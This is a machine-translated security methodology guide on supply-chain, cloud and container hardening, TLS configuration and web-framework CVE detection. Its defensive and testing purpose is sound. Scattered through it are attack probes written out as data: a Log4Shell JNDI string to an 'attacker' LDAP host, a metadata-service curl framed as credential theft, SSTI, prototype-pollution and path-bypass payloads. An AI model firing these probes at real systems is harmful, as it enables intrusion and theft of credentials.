# WebDeployment and supply chain security

> **Source**: Based onWooYunPractical experience in vulnerability databases + Cloud security best practices + OWASPSupply chain security guidelines refinement
> **Methodology**: WooYunVulnerability essence formula + L1-L4Systematic analysis
> **Relevant**: AIApplication container escape testing → [ai-baseline-security.md](ai-baseline-security.md)

---

## One、Supply chain and component security

### 1.1 Nature of vulnerabilities

```
Supply Chain Risks = Trust in third-party code × Transitive dependency depth × Update lag
```

In the application 70-90% The code comes from open source components, and a high-risk component vulnerability can affect tens of thousands of projects (such as Log4Shell、Polyfill.io).

### 1.2 Frontend supply chain

**npm/yarn Dependency risks**

| Attack type | Description | Typical Case |
|----------|------|----------|
| Malicious packets. | Malicious packages with similar names(typosquatting) | `crossenv` Stealing environment variables |
| Prototype pollution | `lodash`/`jQuery` Prototype chain pollution | CVE-2019-10744 |
| Dependency hijacking | Backdoor implanted after the maintainer's account was compromised | `event-stream` Mining |
| CDNPoisoning | PublicCDNHostedJSTampered | Polyfill.ioSupply chain attack |
| Build injection | package.json scriptsHook executes malicious command | `postinstall` Script attacks |

**Detection method**

```bash
# Audit known vulnerabilities
npm audit
yarn audit

# Check outdated dependencies
npm outdated

# View dependency tree depth
npm ls --all | head -100

# Check suspicious installation scripts
npm pack --dry-run  # View the files that are about to be installed
cat node_modules/<pkg>/package.json | grep -A5 '"scripts"'
```

### 1.3 Backend Supply Chain

**Python/pip**

```bash
# Known vulnerability audit
pip-audit
safety check

# View dependencies
pip list --outdated
pipdeptree  # Visualize Dependency Tree
```

**Java/Maven**

```bash
# OWASP Dependency-Check
mvn org.owasp:dependency-check-maven:check

# View Dependency Tree
mvn dependency:tree
```

**Quick reference for common high-risk component vulnerabilities**

| Components | CVE | Impact | Detection |
|------|-----|------|------|
| Log4j2 | CVE-2021-44228 | RCE | `${jndi:ldap://attacker/}` |
| Spring4Shell | CVE-2022-22965 | RCE | Spring Framework < 5.3.18 |
| FastJSON | CVE-2022-25845 | RCE | autoTypeDeserialization |
| Apache Struts2 | CVE-2017-5638 | RCE | Content-TypeInjection |
| Jackson | CVE-2019-12384 | RCE | Polymorphic deserialization |
| Commons-Collections | CVE-2015-6420 | RCE | JavaDeserialization chain |
| jQuery | CVE-2020-11022 | XSS | < 3.5.0 HTMLInjection |
| Lodash | CVE-2021-23337 | RCE | Template injection |

### 1.4 DockerImage supply chain

```bash
# Image Vulnerability Scanning
trivy image <image:tag>
grype <image:tag>

# Check base image
docker inspect <image> | grep -i "rootfs\|created\|author"

# View image layer history(Discover hidden files/Key)
docker history --no-trunc <image>
```

**Risk points**:
- Use `latest` Labels instead of fixed versions
- Base Image Too Large(Contains unnecessary tools such asgcc/curl)
- DockerfileHardcoded keys in/Credentials
- InrootUser running container

### 1.5 SCATool recommendations

| Tool | Language/Scene | Characteristics |
|------|-----------|------|
| `npm audit` / `yarn audit` | JavaScript | Built-in,Free |
| `pip-audit` / `safety` | Python | Free |
| OWASP Dependency-Check | Java/.NET | Open source,Supports multiple languages |
| Snyk | All languages | SaaS,Most comprehensive vulnerability database |
| Trivy | Container/IaC/SBOM | Open source,Fast speed |
| Grype | Container image | Open source,AnchoreProduction |
| Renovate / Dependabot | Automatic upgrade | GitHubIntegration |

### 1.6 SBOM(Software Bill of Materials)

```bash
# Generate SBOM (CycloneDXFormat)
cyclonedx-npm --output sbom.json            # Node.js
cyclonedx-py --format json -o sbom.json      # Python
mvn org.cyclonedx:cyclonedx-maven-plugin:makeBom  # Java

# Generate SBOM (SPDXFormat)
syft <image> -o spdx-json > sbom.spdx.json   # Container image
```

SBOM Purpose: Compliance Audit、License compliance、vulnerability tracking、Supply chain transparency.

### 1.7 Defensive measures

- **Lock version**: Use `package-lock.json` / `Pipfile.lock` / `pom.xml` Fixed version
- **Minimal Dependence**: Regularly clean up unused dependencies to avoid transitive dependency bloat
- **CIIntegration**: InCI/CDJoin inSCAScan, vulnerability blocking build
- **Private repository**: UseNexus/VerdaccioProxy to avoid direct access to public repositories
- **Signature verification**: npmSupport`npm audit signatures`Verify package signatures
- **Regular Updates**: SettingsDependabot/RenovateAutomatic upgrade creationPR

---

## Two、Cloud deployment and server security

### 2.1 Nature of risk

```
Deployment Risks = Default configuration trust × Exposure area × Operational negligence
```

Application code security does not equal system security. Misconfigurations in the deployment environment are often the first exploitable entry points for attackers.

### 2.2 Server hardening check

**Port and Service**

```bash
# Scan open ports
nmap -sV -p- <target>

# High-risk port quick-check
# 22(SSH) 3306(MySQL) 6379(Redis) 27017(MongoDB) 9200(Elasticsearch)
# 8080(Tomcat) 8443(Management) 2375(Docker API) 10250(Kubelet)
```

| Checklist | Security Configuration | Risk |
|--------|----------|------|
| SSH | DisablerootLogin、Key authentication、Non22Port | Brute force cracking |
| Database Port | Binding only127.0.0.1/IntranetIP | Unauthorized access |
| Redis | Set Password、Disable external networks、renameDangerous Commands | RCE(Writewebshell/crontab/ssh) |
| MongoDB | Enable authentication、Bind to the intranet | Data leakage |
| Docker API | BindUnix Socket、EnableTLS | Container escape/RCE |
| Elasticsearch | X-PackAuthentication、Disable external networks | Data leakage |
| Kubernetes API | RBAC、Network policy、Audit logs | Cluster takeover |

**Operating system hardening**

```bash
# LinuxHardening check
cat /etc/ssh/sshd_config | grep -E "PermitRootLogin|PasswordAuth|Port"
cat /etc/passwd | grep ':0:'          # IllegalrootUser
find / -perm -4000 2>/dev/null        # SUIDFile
crontab -l                            # Scheduled task backdoor
last -20                              # Recent login records
ss -tlnp                              # Listening port
iptables -L -n                        # Firewall Rules
```

### 2.3 TLS/SSL/HTTPS Configuration

**Test method**

```bash
# SSL/TLSConfiguration check
nmap --script ssl-enum-ciphers -p 443 <target>
testssl.sh <target>
sslyze <target>

# Online check
# https://www.ssllabs.com/ssltest/
```

**Frequently asked questions**

| Issue | Risk | Fix |
|------|------|------|
| TLS 1.0/1.1 Not disabled | BEAST/POODLEAttack | Only enableTLS 1.2+ |
| Weak cipher suites(RC4/DES/MD5) | Degradation attack | UseAES-GCM/ChaCha20 |
| Certificate expired/Self-signed | Man-in-the-middle attack | UseLet's Encrypt/CACertificate |
| Missing.HSTSHeader | SSL Strip | `Strict-Transport-Security: max-age=31536000` |
| Mixed content(HTTP+HTTPS) | content hijacking | Entire siteHTTPS+CSP |

**NginxSecurity configuration reference**

```nginx
server {
    listen 443 ssl http2;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
    ssl_prefer_server_ciphers on;
    
    # Security header
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Content-Type-Options nosniff;
    add_header X-Frame-Options DENY;
    add_header X-XSS-Protection "1; mode=block";
    add_header Content-Security-Policy "default-src 'self'";
    add_header Referrer-Policy strict-origin-when-cross-origin;
    
    # Hidden Version
    server_tokens off;
    
    # Disable directory listing
    autoindex off;
}
```

### 2.4 Cloud service security

**General cloud risk (AWS/Azure/GCP/Alibaba Cloud)**

| Risk | Detection method | Impact |
|------|----------|------|
| S3/OSSBucket exposed | `aws s3 ls s3://bucket --no-sign-request` | Data leakage |
| IAMPermissions are too broad | Check`*`Wildcard policy | Privilege Escalation |
| Security Group Fully Open | Check`0.0.0.0/0`Inbound Rules | Expose internal services |
| Hardcoded key | `trufflehog`/`gitleaks` Scan code repository | Account takeover |
| Metadata service | `curl http://169.254.169.254/` (SSRFUtilize) | Credential theft |
| Logging not enabled | CloudTrail/ActionTrailAudit | Unable to trace |

**PaaSPlatform Risk (Railway/Vercel/Heroku/Netlify)**

| Risk | Description | Detection |
|------|------|------|
| Environment variable leakage | Build Logs/Error page exposureENV | View public build logs |
| Domain takeover | CNAMEPointing to deletedPaaSApplication | `dig CNAME <domain>` Check hanging records |
| Shared runtime escape | Insufficient isolation between multi-tenant containers | Probe same-node services |
| Deployment Credential Leak | API TokenInCIPlaintext in the configuration | ReviewCI/CDConfiguration file |
| Function injection | ServerlessFunction event injection | Test event parameter controllability |

**Cloud key leakage detection**

```bash
# Code repository scanning.
gitleaks detect --source=. --verbose
trufflehog git https://github.com/org/repo

# Common leakage locations
.env / .env.production / .env.local
docker-compose.yml
CIConfiguration: .github/workflows/*.yml / .gitlab-ci.yml / Jenkinsfile
Frontend code: next.config.js / .env.NEXT_PUBLIC_*
```

### 2.5 Container and Orchestration Security

> **AIApplication container escape**: TargetingAI Agent/LLMContainer escape testing methodology for deployment environments → [ai-baseline-security.md](ai-baseline-security.md) §Twenty

**DockerSecurity check**

```bash
# Container in a nonrootRun
docker inspect <container> | grep '"User"'

# Check privileged mode
docker inspect <container> | grep '"Privileged"'

# Check mount(Sensitive directories)
docker inspect <container> | grep -A10 '"Mounts"'

# CheckCapabilities
docker inspect <container> | grep -A20 '"CapAdd"'
```

**KubernetesSecurity check**

```bash
# RBACAudit
kubectl auth can-i --list --as=system:serviceaccount:default:default
kubectl get clusterrolebinding -o wide

# PodSecurity
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.securityContext}{"\n"}{end}'

# SecretPlaintext Check
kubectl get secrets -o yaml | grep -i "password\|token\|key"

# Network policy
kubectl get networkpolicy -A
```

### 2.6 CI/CDPipeline security

| Risk | Description | Defense |
|------|------|------|
| Plaintext key storage | PipelineHardcoded Keys in Configuration | UseVault/Sealed Secrets |
| Depend on untrusted | CIPulling unverified build tools from | LockingCImirror version |
| Build injection | PRModify inCIConfigure to execute malicious code | Fork PRApproval required before triggeringCI |
| Artifact tampering | Build artifacts unsigned | Cosign/NotarySignature |
| Permissions are too broad | CI TokenHave administrative privileges | Least privilegeToken |

### 2.7 Deployment securityChecklist

**Server**
- [ ] SSHKey login,Disable Password androot
- [ ] firewall only opens necessary ports(80/443)
- [ ] Database/Caching only listens to the intranet.
- [ ] Regular UpdatesOSand Middleware Patches
- [ ] Enable audit logs and intrusion detection

**HTTPS**
- [ ] TLS 1.2+ and disable weak cipher suites
- [ ] HSTSHeader + CAARecord
- [ ] Automatic certificate renewal(Let's Encrypt)

**Cloud Services**
- [ ] IAMLeast privilege + MFA
- [ ] Storage bucket private + Encryption
- [ ] Security group restricts sourceIP
- [ ] CloudTrail/Audit Log Enabled
- [ ] Key passKMS/VaultManagement,Do not hardcode

**Container**
- [ ] NonrootUser Running
- [ ] Read-only file system
- [ ] No privilege mode + MinimumCapabilities
- [ ] Mirror scanning(Trivy/Grype)
- [ ] Network policy isolationPodInterval Communication

**CI/CD**
- [ ] Key passSecretManagement,Not in the configuration file
- [ ] SCAScan integrated into the build pipeline
- [ ] Artifact signature verification
- [ ] Fork PRTrigger construction only after approval

---

## Three、GenericWebFrameworkCVEDetection methodology

> Applicable to Next.js、Spring Boot、Django、Rails、Express、Laravel Wait for anyWebKnown frameworkCVEDetection and exploitation verification

### 3.1 Framework fingerprinting

**Automated Fingerprinting Collection**

| Source of Fingerprint | Detection method | information extraction |
|----------|----------|----------|
| HTTPResponse headers | Check`X-Powered-By`、`Server`、`X-Framework` | Framework name and version |
| CookieName | `JSESSIONID`(Java), `laravel_session`(Laravel), `_next`(Next.js) | Framework type |
| Default error page | Trigger404/500Analyze page features、Style、Copywriting | Framework+Debug Mode |
| Static resource path | `/_next/`(Next.js), `/static/`(Django), `/assets/`(Rails) | Framework+Build Tools |
| JSFile content | Search`webpack`/`vite`/`turbopack`Identify、Framework Version String | Accurate version number |
| Source Map | Access`*.js.map`Check for leakage、AnalysisimportPath | Framework+Complete list of dependencies |
| Meta tags/Comments | HTMLIn`<meta name="generator">`、Build Comments | Framework Version |
| package.jsonDisclosure | Access`/package.json`、`/composer.json`、`/Gemfile.lock` | All dependencies and exact versions. |

```
Fingerprint recognition process:
1. Passive collection → Response headers、Cookie、HTML、JSAnalysis
2. Active probing → Default path、Error trigger、Configuration file access
3. Version Locking → Precise to the major version.Subversion.Patch version
4. CVEMatching → NVD/Snyk/GitHub Advisory Query
```

### 3.2 CVERetrieve andPoCverification

**CVEData source**

| Data source | URL | Characteristics |
|--------|-----|------|
| NVD | nvd.nist.gov | OfficialCVELibrary,CVSSScoring |
| GitHub Advisory | github.com/advisories | Open source project vulnerabilities, includingPoCLink |
| Snyk | snyk.io/vuln | Dependency level exact match |
| Exploit-DB | exploit-db.com | VerifiedPoCandEXP |
| PacketStorm | packetstormsecurity.com | Security announcements and exploit code |
| FrameworkChangeLog | Framework officialRelease Notes | Security patch details |

**GenericCVEVerification process**

```
1. Version comparison
   Confirm version number → CheckCVEImpact scope(affected versions) → Confirm whether within the impact range

2. PoCReproduce
   a. Search publicPoC (GitHub/Exploit-DB/Security blog)
   b. Understanding vulnerability principles(PatchdiffIs the best material)
   c. Constructing request verification in the testing environment
   d. Attention: Production environment only verifies trigger conditions,Do not execute destructivePayload

3. Patch analysis(L4Defense reverse engineering)
   a. Compare code before and after fixingdiff → Understanding what was fixed
   b. Reverse engineering: Where the processing logic before fixing has defects
   c. Think: Check if the fix is complete?Is there a possibility of bypassing the fix??
```

### 3.3 Common Framework Attack Surface Classification

| Attack surface type | General detection methods | Typical vulnerability patterns |
|-----------|-------------|-------------|
| **Routing/Middleware bypass** | Path normalization testing: `//path`、`/./path`、`/%2e/path`、Case variations、Special request header forgery | Authentication bypass、Authentication skip |
| **Template/Render Injection** | Inject template syntax in parameters: `{{7*7}}`(Jinja2), `${7*7}`(Thymeleaf), `<%= 7*7 %>`(ERB) | SSTI→RCE |
| **Deserialization** | Identifying serialization format(`ac ed 00 05`/`O:`/`rO0AB`), Send malicious serialized data | Java/PHP/PythonDeserializationRCE |
| **Server Actions/RPC** | Intercept framework-specificRPCCall,Analyze Endpoint Identification,Direct call bypassing frontend validation | CSRF、Input Validation Bypass |
| **SSR/RSCInjection** | Intercept and Modify Server-Side Rendering Parameters(Such as`_rsc`/`__data`/`loader`),Construct exceptionPayload | Server-side code execution |
| **Configuration file leakage** | Traverse Common Configuration Paths: `.env`、`web.config`、`application.yml`、`settings.py` | Key/Credential leakage |
| **Debug endpoint** | Check framework debug mode: `/debug`、`/_debug`、`/__inspect`、`/graphql`(introspection) | Information leakage.→RCE |
| **Prototype pollution(JS)** | JSONInjected in the request body`{"__proto__":{"isAdmin":true}}`Or`{"constructor":{"prototype":{"x":1}}}` | Privilege Escalation、DoS |
| **Cache poisoning** | Manipulate CacheKeyRelated headers(`X-Forwarded-Host`/`X-Original-URL`), Verify if the response is cached | Storage TypeXSS、Phishing |

### 3.4 Framework security generalChecklist

```
[ ] Confirming the exact versions of the framework and all dependencies
[ ] QueryNVD/Snyk/GitHub AdvisoryCorrespondingCVE
[ ] Validate all high-riskCVE(CVSS≥7.0)Has it been fixed?
[ ] Source MapWhether it has been disabled
[ ] Is debugging mode disabled
[ ] Does the error page leak the stack/Path/Version
[ ] Is the default configuration file path accessible?
[ ] Middleware/Can routing authentication be bypassed through path variants
[ ] APIDo all endpoints require authentication(DeleteCookie/TokenTesting)
[ ] Whether security response headers are complete(CSP/HSTS/X-Frame-Options/X-Content-Type-Options)
[ ] CSRFProtection covers all state change operations
[ ] Framework-specificRPC/ActionDoes the endpoint have independent authentication?
```

---

*Based onWooYunVulnerability database(88,636Item.)Refine + Cloud/Supply chain security best practices | For security research and defense reference only*
